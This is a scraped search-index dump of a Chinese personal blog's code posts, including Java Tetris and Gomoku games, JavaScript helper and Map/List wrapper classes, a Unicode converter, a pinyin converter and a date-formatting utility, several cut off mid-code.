JCheckBoxMenuItem miAsWindows = new JCheckBoxMenuItem(\"Windows\"), miAsMotif = new JCheckBoxMenuItem(\"Motif\"), miAsMetal = new JCheckBoxMenuItem(\"Metal\", true); //主游戏类的构造方法@param title String，窗口标题 @SuppressWarnings( \"deprecation\") public ErsBlocksGame(String title) { super(title); setSize( 315, 392 ); Dimension scrSize = Toolkit.getDefaultToolkit() .getScreenSize(); setLocation((scrSize.width - getSize() .width) / 2, (scrSize.height - getSize() .height) / 2); createMenu(); Container container = getContentPane(); container.setLayout( new BorderLayout(6, 0)); canvas = new GameCanvas(20, 12); ctrlPanel = new ControlPanel(this); container.add(canvas, BorderLayout.CENTER); container.add(ctrlPanel, BorderLayout.EAST); addWindowListener( new WindowAdapter() { public void windowClosing(WindowEvent we) { stopGame(); System.exit( 0); } }); addComponentListener( new ComponentAdapter() { public void componentResized(ComponentEvent ce) { canvas.fanning(); } }); show(); canvas.fanning(); } //让游戏\"复位 \" public void reset() { ctrlPanel.reset(); canvas.reset(); } //判断游戏是否还在进行 //@return boolean, true-还在运行，false-已经停止 public boolean isPlaying() { return playing; } /** * 得到当前活动的块 * @return ErsBlock, 当前活动块的引用 */ public ErsBlock getCurBlock() { return block; } //得到当前画布，@return GameCanvas, 当前画布的引用 public GameCanvas getCanvas() { return canvas; } //开始游戏 public void playGame() { play(); ctrlPanel.setPlayButtonEnable( false); miPlay.setEnabled( false); ctrlPanel.requestFocus(); } //游戏暂停 public void pauseGame() { if (block != null) block.pauseMove(); ctrlPanel.setPauseButtonLabel( false); miPause.setEnabled( false); miResume.setEnabled( true); } //让暂停中的游戏继续 public void resumeGame() { if (block != null) block.resumeMove(); ctrlPanel.setPauseButtonLabel( true); miPause.setEnabled( true); miResume.setEnabled( false); ctrlPanel.requestFocus(); } //用户停止游戏 public void stopGame() { playing = false; if (block != null) block.stopMove(); miPlay.setEnabled( true); miPause.setEnabled( true); miResume.setEnabled( false); ctrlPanel.setPlayButtonEnable( true); ctrlPanel.setPauseButtonLabel( true); } //得到游戏者设置的难度， @return int,游戏难度1－MAX_LEVEL public int getLevel() { return ctrlPanel.getLevel(); } //用户设置游戏难度，@param level int,游戏难度1－ MAX_LEVEL public void setLevel(int level) { if (level \u003c 11 \u0026\u0026 level \u003e 0) ctrlPanel.setLevel(level); } //得到游戏积分, @return int, 积分。 public int getScore() { if (canvas != null) return canvas.getScore(); return 0 ; } //得到自上次升级以来的游戏积分，升级以后，此积分清零 //@return int, 积分。 public int getScoreForLevelUpdate() { if (canvas != null) return canvas.getScoreForLevelUpdate(); return 0 ; } //当分数累计到一定的数量时，升一次级 //@return boolean, ture-update successufl, false-update fail pub","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/:0:0","tags":["linux","java","scripts"],"title":"Java 俄罗斯方块","uri":"/posts/scripts/java/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97/"},{"categories":["linux","那些有用没用的"],"content":"五子棋","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/","tags":["linux","java","scripts"],"title":"java 五子棋","uri":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/"},{"categories":["linux","那些有用没用的"],"content":" import java.awt.*; import java.awt.event.*; import javax.swing.*; import javax.swing.JPanel; /* *main方法创建了ChessFrame类的一个实例对象（cf）， *并启动屏幕显示显示该实例对象。 **/ @SuppressWarnings(\"serial\") public class FiveChessAppletDemo { @SuppressWarnings( \"deprecation\") public static void main(String args[]){ ChessFrame cf = new ChessFrame(); cf.show(); } } /* *类ChessFrame主要功能是创建五子棋游戏主窗体和菜单 **/ class ChessFrame extends JFrame implements ActionListener { private String[] strsize={\"20x15\",\"30x20\", \"40x30\"}; private String[] strmode={\"人机对弈 \",\" 人人对弈 \"}; public static boolean iscomputer=true,checkcomputer= true; private int width,height; private ChessModel cm; private MainPanel mp; //构造五子棋游戏的主窗体 public ChessFrame() { this.setTitle( \"五子棋游戏\"); cm= new ChessModel(1); mp= new MainPanel(cm); Container con= this.getContentPane(); con.add(mp, \"Center\"); this.setResizable( false); this.addWindowListener( new ChessWindowEvent()); MapSize( 20,15 ); JMenuBar mbar = new JMenuBar(); this.setJMenuBar(mbar); JMenu gameMenu = new JMenu(\"游戏 \"); mbar.add(makeMenu(gameMenu, new Object[] { \"开局\", \"棋盘\" ,\"模式 \", null , \"退出 \" }, this)); JMenu lookMenu = new JMenu(\"视图 \"); mbar.add(makeMenu(lookMenu, new Object[] { \"Metal\",\"Motif\" ,\"Windows\" }, this)); JMenu helpMenu = new JMenu(\"帮助 \"); mbar.add(makeMenu(helpMenu, new Object[] { \"关于\" }, this)); } //构造五子棋游戏的主菜单 public JMenu makeMenu(Object parent, Object items[], Object target){ JMenu m = null; if(parent instanceof JMenu) m = (JMenu)parent; else if (parent instanceof String) m = new JMenu((String)parent); else return null ; for(int i = 0; i \u003c items.length; i++) if(items[i] == null) m.addSeparator(); else if (items[i] == \"棋盘\" ){ JMenu jm = new JMenu(\"棋盘 \"); ButtonGroup group= new ButtonGroup(); JRadioButtonMenuItem rmenu; for (int j=0;j\u003cstrsize.length;j++){ rmenu=makeRadioButtonMenuItem(strsize[j],target); if (j==0 ) rmenu.setSelected( true); jm.add(rmenu); group.add(rmenu); } m.add(jm); } else if (items[i] == \"模式\" ){ JMenu jm = new JMenu(\"模式 \"); ButtonGroup group= new ButtonGroup(); JRadioButtonMenuItem rmenu; for (int h=0;h\u003cstrmode.length;h++){ rmenu=makeRadioButtonMenuItem(strmode[h],target); if(h==0 ) rmenu.setSelected( true); jm.add(rmenu); group.add(rmenu); } m.add(jm); } else m.add(makeMenuItem(items[i], target)); return m; } //构造五子棋游戏的菜单项 public JMenuItem makeMenuItem(Object item, Object target){ JMenuItem r = null; if(item instanceof String) r = new JMenuItem((String)item); else if (item instanceof JMenuItem) r = (JMenuItem)item; else return null ; if(target instanceof ActionListener) r.addActionListener((ActionListener)target); return r; } //构造五子棋游戏的单选按钮式菜单项 public JRadioButtonMenuItem makeRadioButtonMenuItem( Object item, Object target){ JRadioButtonMenuItem r = null; if(item instanceof String) r = new JRadioButtonMenuItem((String)item); else if(item instanceof JRadioButtonMenuItem) r = (JRadioButtonMenuItem)item; else return null ; if(target instanceof ActionListener) r.addActionListener((ActionListener)target); return r; } public void MapSize(int w,int h){ setSize(w * 20+50 , h * 20+ 100 ); if( this.checkcomputer) this.iscomputer= true; else this.iscomputer= false; mp.setModel(cm); mp.repaint(); } public boolean getiscomputer(){ return this.iscomputer; } public void restart(){ int modeChess = cm.getModeChess(); if(modeChess \u003c= 3 \u0026\u0026 modeChess \u003e= 1){ cm = new ChessModel(modeChess); MapSize(cm.getWidth(),cm.getHeight()); }else{ System.out.println( \"\\u81EA\\u5B9A\\u4E49\" ); } } public void actionPerformed(ActionEvent e){ String arg=e.getActionCommand(); try{ if (arg.equals(\"Windows\")) UIManager.setLookAndFeel( \"com.sun.java.swing.plaf.windows.WindowsLookAndFeel\" ); else if (arg.equals(\"Motif\")) UIManager.setLookAndFeel( \"com.sun.java.swing.plaf.motif.MotifLookAndFeel\" ); else UIManager.setLookAndFeel( \"javax.swing.plaf.metal.MetalLookAndFeel\" ); SwingUtilities.updateComponentTreeUI( this); } catch(Exception ee){} if(arg.equals(\"20x15\")){ this.width= 20; this.height= 15; cm= new ChessModel(1); MapSize( this.width, this.height","date":"2022-06-24","objectID":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/:0:0","tags":["linux","java","scripts"],"title":"java 五子棋","uri":"/posts/scripts/java/%E4%BA%94%E5%AD%90%E6%A3%8B/"},{"categories":["那些年的收藏"],"content":"javascript 帮助类","date":"2022-06-24","objectID":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/","tags":["linux","javascript","scripts"],"title":"javascript 帮助类","uri":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/"},{"categories":["那些年的收藏"],"content":" function check_browser() { Opera = (navigator .userAgent .indexOf (\"Opera\", 0) != -1 )?1: 0; MSIE = (navigator .userAgent .indexOf (\"Microsoft\", 0) != -1 )?1: 0; FX = (navigator .userAgent .indexOf (\"Mozilla\", 0) != -1 )?1: 0; if ( Opera ) brow_type = \"Opera\"; else if ( FX )brow_type = \"Firefox\"; else if ( MSIE )brow_type = \"MSIE\"; return brow_type ; } function getWindowHeight() { var windowHeight = 0 ; if ( typeof(window.innerHeight ) == 'number') { windowHeight = window .innerHeight ; } else { if ( document.documentElement \u0026\u0026 document.documentElement. clientHeight) { windowHeight = document .documentElement .clientHeight ; } else { if ( document.body \u0026\u0026 document .body .clientHeight ) { windowHeight = document .body .clientHeight ; } } } return windowHeight; } function getWindowWidth() { var windowWidth = 0 ; if ( typeof(window.innerWidth ) == 'number') { windowWidth = window .innerWidth ; } else { if ( document.documentElement \u0026\u0026 document.documentElement. clientWidth) { windowWidth = document .documentElement .clientWidth ; } else { if ( document.body \u0026\u0026 document .body .clientWidth ) { windowWidth = document .body .clientWidth ; } } } return windowWidth; } /*open window at the middle\u0026center of screen*/ function openwindow(url,name,iWidth,iHeight,isFullScreen ) { var url; var name; var iWidth; var iHeight; if(isFullScreen !=undefined \u0026\u0026 isFullScreen== '1') { iWidth = window .screen .availWidth - 10; iHeight = window .screen .availHeight - 30; } var iTop = ( window.screen.availHeight -30- iHeight)/2 ; var iLeft = ( window.screen.availWidth -10- iWidth)/2 ; window .open (url ,name ,'height='+ iHeight+',innerHeight=' +iHeight +',width='+ iWidth+',innerWidth=' +iWidth +',top='+ iTop+',left=' +iLeft +',toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,status=yes,titlebar=yes' ); } /* function: compare old_str and new_str, then output add_str and del_str example_1: old_str=1,2,3,5;new_str=1,3,4,6;compareStr(old_str,new_str)=4,6;2,5 notice: under any condition, ';' exists all the same! */ function compareStr(oldStr,newStr) { if(oldStr==newStr) { return ';' ; } if(oldStr=='' ) { return newStr+ ';'; } if(newStr=='' ) { return ';' +oldStr ; } var oldArr = oldStr.split(',' ); var newArr = newStr.split(',' ); var dels = '' ; var adds = '' ; for(var i= 0;i\u003coldArr .length ;i ++) { var tag = 0 ; for(var j= 0;j\u003cnewArr .length ;j ++) { if(oldArr[i] == newArr[j] ) { tag = 1; break; } } if(tag == 0) { dels = dels + oldArr[i] + ','; } } for(var i= 0;i\u003cnewArr .length ;i ++) { var tag = 0 ; for(var j= 0;j\u003coldArr .length ;j ++) { if(newArr[i] == oldArr[j] ) { tag = 1; break; } } if(tag == 0) { adds = adds + newArr[i] + ','; } } if(dels=='' \u0026\u0026 adds!='' ) { return adds. substring(0 ,adds .lastIndexOf (',')) + ';' ; } else if (adds =='' \u0026\u0026 dels !='') { return ';' + dels.substring (0, dels.lastIndexOf (',')); } else if (adds =='' \u0026\u0026 dels =='') { return ';' ; } else { return adds. substring(0 ,adds .lastIndexOf (',')) + ';' + dels.substring( 0,dels.lastIndexOf (',')); } } /*JS高精度计算*/ //除法 function accDiv(arg1,arg2){ var t1= 0,t2=0 ,r1 ,r2 ; try{t1=arg1.toString ().split( \".\")[1].length}catch (e ){} try{t2=arg2.toString ().split( \".\")[1].length}catch (e ){} with(Math){ r1 =Number (arg1 .toString ().replace( \".\",\"\" )) r2 =Number (arg2 .toString ().replace( \".\",\"\" )) return ( r1/ r2)* pow(10 ,t2 -t1 ); } } //乘法 function accMul(arg1,arg2) { var m= 0,s1=arg1.toString (),s2= arg2.toString (); try{m+=s1.split(\".\" )[ 1] .length }catch( e){} try{m+=s2.split(\".\" )[ 1] .length }catch( e){} return Number(s1. replace(\".\" ,\"\"))* Number(s2.replace(\".\" ,\"\"))/ Math.pow(10 ,m ); } //加法 function accAdd(arg1,arg2){ var r1, r2, m; try{r1=arg1.toString ().split( \".\")[1].length}catch (e ){r1 =0} try{r2=arg2.toString ().split( \".\")[1].length}catch (e ){r2 =0} m =Math .pow (10, Math.max(r1,r2)) return ( arg1*m+arg2*m)/m; } //减法 function accSubtr(arg1,arg2){ var r1 ,r2 ,m ,n ; try{ r1= arg1.toString ().split( \".\")[1].length}catch (e ){r1 =0} try{ r2= arg2.toString ","date":"2022-06-24","objectID":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/:0:0","tags":["linux","javascript","scripts"],"title":"javascript 帮助类","uri":"/posts/scripts/javascript/%E5%B8%AE%E5%8A%A9%E7%B1%BB/"},{"categories":["那些年的收藏"],"content":"javascript 帮助类","date":"2022-06-24","objectID":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/","tags":["linux","javascript","scripts"],"title":"javascript 封装map、list","uri":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/"},{"categories":["那些年的收藏"],"content":"当年收藏的一个封装脚本 /* * Util.$(objid)：获取指定ID的dom对象 * * Util.ie：判断浏览器是否为IE * * List类：模拟java的List，支持iterator * add(obj)：向List的最后追加一个对象 * addat(index, obj)：在List的index位置插入一个对象 * get(index)：在List获取index位置的对象 * set(index, obj)：在List的替换index位置的对象 * size()：获取List的对象个数 * remove(index)：移除List中index位置的对象 * clear()：清空List * iterator()：获取到List的迭代对象 * * Map类：模拟java的Map，支持直接对value的iterator * put(key, value)：在Map的添加一个key value的键值对 * get(key)：在Map获取键为key的值 * remove(key)：溢出Map中键为key的对象 * containsKey(key)：判断Map中是否存在指定key的对象 * keySet()：获取Map中所有的键的List * values()：获取Map中所有的值的List * size()：获取List的对象个数 * clear()：清空List * iterator()：获取到List的迭代对象 * * Iterator用法：for(var it = list.iterator(); it.hasNext();) { var item = it.next(); } * * Url类：获取url中参数的值，使用var u = new Url(location.search); var value = url.getvalue(para);即可得到 * * EventHandler类：封装事件方法，可以为事件方法的调用添加参数，屏蔽了浏览器差异 * EventHandler.createEvent(func, ...args)：创建事件对象，args为参数值，需要与func的参数对应，不需要传递event对象 * EventHandler.getEvent()：在事件的处理方法中获取当前的event对象 * EventHandler.getElement(e)：获取触发event事件的dom对象 * EventHandler.attachEvent(obj, eventname, func)：为obj添加eventname事件，事件处理方法为func * EventHandler.detachEvent(obj, eventname, func)：为obj注销eventname事件的func方法 * * EventType类：封装了客户端的大多数事件类型，屏蔽了浏览器差异 * 使用方式：EventHandler.attachEvent(obj, EventType.click, func) * 目前封装了click, rclick, mousedown, mousemove, mouseup, mouseover, mouseout, scroll, focus, blur, change, keypress, keydown, keyup, submit */ /* * 修改记录 */ function Util() {} Util.$ = function (objid) { return document.getElementById(objid); }; //浏览器的判断，true为IE，false为Firefox Util.ie = navigator.appName.indexOf(\"Microsoft\") != -1 ? true : false; function Iterator(iteratorArray) { this.itArr = iteratorArray; this.index = -1; } Iterator.prototype = { hasNext: function () { if (this.index + 1 \u003e= this.itArr.length) { return false; } else { return true; } }, next: function () { this.index++; return this.itArr[this.index]; }, }; function Map() { this.arr = new Array(); } Map.prototype = { put: function (key, value) { if (!this.containsKey(key)) { this.arr.push([key, value]); } else { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { this.arr[i][1] = value; return; } } } }, get: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { return this.arr[i][1]; } } return null; }, remove: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { this.arr.splice(i, 1); return; } } }, containsKey: function (key) { for (var i = 0; i \u003c this.arr.length; i++) { if (this.arr[i][0] == key) { return true; } } return false; }, keySet: function () { var l = new List(); for (var i = 0; i \u003c this.arr.length; i++) { l.add(this.arr[i][0]); } return l; }, values: function () { var l = new List(); for (var i = 0; i \u003c this.arr.length; i++) { l.add(this.arr[i][1]); } return l; }, size: function () { return this.arr.length; }, clear: function () { this.arr = []; }, iterator: function () { var vs = new Array(); for (var i = 0; i \u003c this.arr.length; i++) { vs.push(this.arr[i][1]); } var it = new Iterator(vs); return it; }, }; function List() { this.arr = new Array(); } List.prototype = { add: function (obj) { this.arr.push(obj); }, addat: function (index, obj) { this.arr.splice(index, 0, obj); }, get: function (index) { return this.arr[index]; }, set: function (index, obj) { this.arr.splice(index, 1, obj); }, size: function () { return this.arr.length; }, remove: function (index) { this.arr.splice(index, 1); }, clear: function () { this.arr = []; }, iterator: function () { var it = new Iterator(this.arr); return it; }, }; function Url(urlstr) { this.paraMap = new Map(); if (urlstr.indexOf(\"?\") \u003e -1) { urlstr = urlstr.substr(1); } if (urlstr.indexOf(\"\u0026\") \u003e -1) { var pvarr = urlstr.split(\"\u0026\"); for (var i = 0; i \u003c pvarr.length; i++) { var pv = pvarr[i].split(\"=\"); this.paraMap.put(pv[0], pv[1]); } } else { var pv = urlstr.split(\"=\"); this.paraMap.put(pv[0], pv[1]); } } Url.prototype = { getvalue: function (para) { return this.","date":"2022-06-24","objectID":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/:0:0","tags":["linux","javascript","scripts"],"title":"javascript 封装map、list","uri":"/posts/scripts/javascript/maplist%E5%B0%81%E8%A3%85/"},{"categories":["那些年的收藏"],"content":"汉字及unicode互转","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/","tags":["linux","java","scripts"],"title":"java汉字及unicode互转","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/"},{"categories":["那些年的收藏"],"content":"java 汉字和unicode互转 import java.io.UnsupportedEncodingException; public class UnicodeConverter { public static void main(String[] args) throws UnsupportedEncodingException { String s = \" \\t小\\u51AC\"; System.out.println(\"Original:\\t\\t\" + s); s = toEncodedUnicode(s, true); System.out.println(\"to unicode:\\t\\t\" + s); s = fromEncodedUnicode(s.toCharArray(), 0, s.length()); System.out.println(\"from unicode:\\t\" + s); } private static final char[] hexDigit = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F' }; private static char toHex(int nibble) { return hexDigit[(nibble \u0026 0xF)]; } /** * 将字符串编码成 Unicode 形式的字符串. 如 \"小\" to \"\\u5c0f\" * Converts unicodes to encoded \\\\uxxxx and escapes * special characters with a preceding slash * * @param theString * 待转换成Unicode编码的字符串。 * @param escapeSpace * 是否忽略空格，为true时在空格后面是否加个反斜杠。 * @return 返回转换后Unicode编码的字符串。 */ public static String toEncodedUnicode(String theString, boolean escapeSpace) { int len = theString.length(); int bufLen = len * 2; if (bufLen \u003c 0) { bufLen = Integer.MAX_VALUE; } StringBuffer outBuffer = new StringBuffer(bufLen); for (int x = 0; x \u003c len; x++) { char aChar = theString.charAt(x); // Handle common case first, selecting largest block that // avoids the specials below if ((aChar \u003e 61) \u0026\u0026 (aChar \u003c 127)) { if (aChar == '\\\\') { outBuffer.append('\\\\'); outBuffer.append('\\\\'); continue; } outBuffer.append(aChar); continue; } switch (aChar) { case ' ': if (x == 0 || escapeSpace) outBuffer.append('\\\\'); outBuffer.append(' '); break; case '\\t': outBuffer.append('\\\\'); outBuffer.append('t'); break; case '\\n': outBuffer.append('\\\\'); outBuffer.append('n'); break; case '\\r': outBuffer.append('\\\\'); outBuffer.append('r'); break; case '\\f': outBuffer.append('\\\\'); outBuffer.append('f'); break; case '=': // Fall through case ':': // Fall through case '#': // Fall through case '!': outBuffer.append('\\\\'); outBuffer.append(aChar); break; default: if ((aChar \u003c 0x0020) || (aChar \u003e 0x007e)) { // 每个unicode有16位，每四位对应的16进制从高位保存到低位 outBuffer.append('\\\\'); outBuffer.append('u'); outBuffer.append(toHex((aChar \u003e\u003e 12) \u0026 0xF)); outBuffer.append(toHex((aChar \u003e\u003e 8) \u0026 0xF)); outBuffer.append(toHex((aChar \u003e\u003e 4) \u0026 0xF)); outBuffer.append(toHex(aChar \u0026 0xF)); } else { outBuffer.append(aChar); } } } return outBuffer.toString(); } /** * 从 Unicode 形式的字符串转换成对应的编码的特殊字符串。 如 \"\\u5c0f\" to \"小\". * Converts encoded \\\\uxxxx to unicode chars * and changes special saved chars to their original forms * * @param in * Unicode编码的字符数组。 * @param off * 转换的起始偏移量。 * @param len * 转换的字符长度。 * @param convtBuf * 转换的缓存字符数组。 * @return 完成转换，返回编码前的特殊字符串。 */ public static String fromEncodedUnicode(char[] in , int off, int len) { char aChar; char[] out = new char[len]; // 只短不长 int outLen = 0; int end = off + len; while (off \u003c end) { aChar = in [off++]; if (aChar == '\\\\') { aChar = in [off++]; if (aChar == 'u') { // Read the xxxx int value = 0; for (int i = 0; i \u003c 4; i++) { aChar = in [off++]; switch (aChar) { case '0': case '1': case '2': case '3': case '4': case '5': case '6': case '7': case '8': case '9': value = (value \u003c\u003c 4) + aChar - '0'; break; case 'a': case 'b': case 'c': case 'd': case 'e': case 'f': value = (value \u003c\u003c 4) + 10 + aChar - 'a'; break; case 'A': case 'B': case 'C': case 'D': case 'E': case 'F': value = (value \u003c\u003c 4) + 10 + aChar - 'A'; break; default: throw new IllegalArgumentException(\"Malformed \\\\uxxxx encoding.\"); } } out[outLen++] = (char) value; } else { if (aChar == 't') { aChar = '\\t'; } else if (aChar == 'r') { aChar = '\\r'; } else if (aChar == 'n') { aChar = '\\n'; } else if (aChar == 'f') { aChar = '\\f'; } out[outLen++] = aChar; } } else { out[outLen++] = (char) aChar; } } return new String(out, 0, outLen); } } ","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/:1:0","tags":["linux","java","scripts"],"title":"java汉字及unicode互转","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E5%8F%8Aunicode%E4%BA%92%E8%BD%AC/"},{"categories":["那些年的收藏"],"content":"汉字转拼音","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/","tags":["linux","java","scripts"],"title":"java汉字转拼音","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"},{"categories":["那些年的收藏"],"content":"汉字转拼音(非使用依赖包) import java.nio.ByteBuffer; import java.util.TreeMap; /** * * 汉字转化为全拼 * JDK版本: 6 * 需要注意的是：这里面利用gb2312的编码规则，根据拼音区间来获取拼音，主要可以练习TreeMap的使用。 * 但其实拼音规则涵盖的中文并不全面，要求较高的地方不建议使用这个类。 * 附上拼音和汉字对照表pinyin1.txt，可以利用这个文件建立Map。 */ public class CharactorTool { private static TreeMap \u003c Integer, String \u003e spellTree = new TreeMap \u003c Integer, String \u003e (); static { initTreeMap(); } private CharactorTool() {} private static void initTreeMap() { spellTree.put(-20319, \"a\"); spellTree.put(-20317, \"ai\"); spellTree.put(-20304, \"an\"); spellTree.put(-20295, \"ang\"); spellTree.put(-20292, \"ao\"); spellTree.put(-20283, \"ba\"); spellTree.put(-20265, \"bai\"); spellTree.put(-20257, \"ban\"); spellTree.put(-20242, \"bang\"); spellTree.put(-20230, \"bao\"); spellTree.put(-20051, \"bei\"); spellTree.put(-20036, \"ben\"); spellTree.put(-20032, \"beng\"); spellTree.put(-20026, \"bi\"); spellTree.put(-20002, \"bian\"); spellTree.put(-19990, \"biao\"); spellTree.put(-19986, \"bie\"); spellTree.put(-19982, \"bin\"); spellTree.put(-19976, \"bing\"); spellTree.put(-19805, \"bo\"); spellTree.put(-19784, \"bu\"); spellTree.put(-19775, \"ca\"); spellTree.put(-19774, \"cai\"); spellTree.put(-19763, \"can\"); spellTree.put(-19756, \"cang\"); spellTree.put(-19751, \"cao\"); spellTree.put(-19746, \"ce\"); spellTree.put(-19741, \"ceng\"); spellTree.put(-19739, \"cha\"); spellTree.put(-19728, \"chai\"); spellTree.put(-19725, \"chan\"); spellTree.put(-19715, \"chang\"); spellTree.put(-19540, \"chao\"); spellTree.put(-19531, \"che\"); spellTree.put(-19525, \"chen\"); spellTree.put(-19515, \"cheng\"); spellTree.put(-19500, \"chi\"); spellTree.put(-19484, \"chong\"); spellTree.put(-19479, \"chou\"); spellTree.put(-19467, \"chu\"); spellTree.put(-19289, \"chuai\"); spellTree.put(-19288, \"chuan\"); spellTree.put(-19281, \"chuang\"); spellTree.put(-19275, \"chui\"); spellTree.put(-19270, \"chun\"); spellTree.put(-19263, \"chuo\"); spellTree.put(-19261, \"ci\"); spellTree.put(-19249, \"cong\"); spellTree.put(-19243, \"cou\"); spellTree.put(-19242, \"cu\"); spellTree.put(-19238, \"cuan\"); spellTree.put(-19235, \"cui\"); spellTree.put(-19227, \"cun\"); spellTree.put(-19224, \"cuo\"); spellTree.put(-19218, \"da\"); spellTree.put(-19212, \"dai\"); spellTree.put(-19038, \"dan\"); spellTree.put(-19023, \"dang\"); spellTree.put(-19018, \"dao\"); spellTree.put(-19006, \"de\"); spellTree.put(-19003, \"deng\"); spellTree.put(-18996, \"di\"); spellTree.put(-18977, \"dian\"); spellTree.put(-18961, \"diao\"); spellTree.put(-18952, \"die\"); spellTree.put(-18783, \"ding\"); spellTree.put(-18774, \"diu\"); spellTree.put(-18773, \"dong\"); spellTree.put(-18763, \"dou\"); spellTree.put(-18756, \"du\"); spellTree.put(-18741, \"duan\"); spellTree.put(-18735, \"dui\"); spellTree.put(-18731, \"dun\"); spellTree.put(-18722, \"duo\"); spellTree.put(-18710, \"e\"); spellTree.put(-18697, \"en\"); spellTree.put(-18696, \"er\"); spellTree.put(-18526, \"fa\"); spellTree.put(-18518, \"fan\"); spellTree.put(-18501, \"fang\"); spellTree.put(-18490, \"fei\"); spellTree.put(-18478, \"fen\"); spellTree.put(-18463, \"feng\"); spellTree.put(-18448, \"fo\"); spellTree.put(-18447, \"fou\"); spellTree.put(-18446, \"fu\"); spellTree.put(-18239, \"ga\"); spellTree.put(-18237, \"gai\"); spellTree.put(-18231, \"gan\"); spellTree.put(-18220, \"gang\"); spellTree.put(-18211, \"gao\"); spellTree.put(-18201, \"ge\"); spellTree.put(-18184, \"gei\"); spellTree.put(-18183, \"gen\"); spellTree.put(-18181, \"geng\"); spellTree.put(-18012, \"gong\"); spellTree.put(-17997, \"gou\"); spellTree.put(-17988, \"gu\"); spellTree.put(-17970, \"gua\"); spellTree.put(-17964, \"guai\"); spellTree.put(-17961, \"guan\"); spellTree.put(-17950, \"guang\"); spellTree.put(-17947, \"gui\"); spellTree.put(-17931, \"gun\"); spellTree.put(-17928, \"guo\"); spellTree.put(-17922, \"ha\"); spellTree.put(-17759, \"hai\"); spellTree.put(-17752, \"han\"); spellTree.put(-17733, \"hang\"); spellTree.put(-17730, \"hao\"); spellTree.put(-17721, \"he\"); spellTree.put(-17703, \"hei\"); spellTree.put(-17701, \"hen\"); spellTree.put(-17697, \"heng\"); spellTree.put(-17692, \"hong\"); spellTree.put(-17683, \"hou\"); spellTree.put(-17676, \"hu\"); spellTree.put(-17496, \"hua\"); spe","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/:1:0","tags":["linux","java","scripts"],"title":"java汉字转拼音","uri":"/posts/scripts/java/%E6%B1%89%E5%AD%97%E8%BD%AC%E6%8B%BC%E9%9F%B3/"},{"categories":["那些年的收藏"],"content":"日期格式化处理组件","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/","tags":["linux","java","scripts"],"title":"Java日期格式化处理组件","uri":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":"java 日期格式化处理组件 import java.text.DateFormat; import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Calendar; import java.util.Date; import java.util.Locale; import org.apache.commons.lang.StringUtils; /** * 日期格式化处理组件 * @author chenxiaodong * @version Apr 21, 2010 5:50:00 PM */ public class TimeUtil s { /** * 将长整型的日期转化为字符型日期字符串 * @param intDate 长整型日期 */ public static String formatIntToDateString(long intDate) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型的日期转化为字符型日期字符串 * @param intDate 长整型日期 * @return pattern 格式 */ public static String formatIntToDateString(long intDate,String pattern) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); if(pattern!=null) { format = new SimpleDateFormat(pattern, Locale.getDefault()); } else { format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\", Locale.getDefault()); } strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型的日期转化为字符型日期字符串 yyyy- MM-dd * @param intDate 长整型日期 * @return String 字符型时间 */ public static String formatIntToDateStringT(long intDate) { Date time; SimpleDateFormat format; String strtime; if (intDate \u003e 0) { try { long c_unix_time2 = intDate; time = new Date(); time.setTime(c_unix_time2 * 1000); format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale.getDefault()); strtime = format.format(time); } catch (Exception ex) { strtime = \"\"; ex.printStackTrace(); } } else { strtime = \"\"; } return strtime; } /** * 将长整型的日期转化为一定格式字符型日期字符串 * @param _format 格式化 例如:yyyy 